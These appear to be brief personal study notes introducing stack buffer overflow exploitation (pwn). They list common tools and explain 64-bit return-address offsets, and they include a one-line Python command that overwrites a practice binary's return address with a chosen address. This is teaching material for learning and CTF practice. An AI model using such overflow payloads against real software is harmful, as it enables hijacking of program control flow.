# PWN | Intro
pwntools（Python 漏洞利用框架）
GDB + pwndbg / GEF
ROPgadget / ropper
one_gadget
checksec



# RBP
Saved Fream Pointer (RBP)

# Cover Return Address
- `python3 -c 'import sys; from struct import pack; sys.stdout.buffer.write(b"A"*40 + pack("<Q", 0x401196))' | ./vuln`

#
nm TAREGET

# GDB
- `info address TARGET`
- `info registers`

**pattern create**

- `run <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*40 + b"B"*40 + b"C"*40)')`
## Find Return Address
Since we can't use pattern create, let's use a simple trick. We know the buffer is 32 bytes. On 64-bit systems, there is usually an 8-byte "Saved Base Pointer" (RBP) sitting right after your buffer and right before the "Return Address."

Find the Offset: Determine exactly how many bytes are between the start of buf and the Return Address. (Usually 32 bytes for the buffer + some padding for the base pointer, often totaling 40 or 44 bytes on 64-bit systems).

Memory Addresses are 64-bit: You must use p64() in Python (8 bytes) instead of p32().

The Offset: On 64-bit systems, the stack often aligns to 16 bytes. While your buffer is 32 bytes, the distance to the return address is likely 40 bytes (32 for the buffer + 8 for the saved Base Pointer).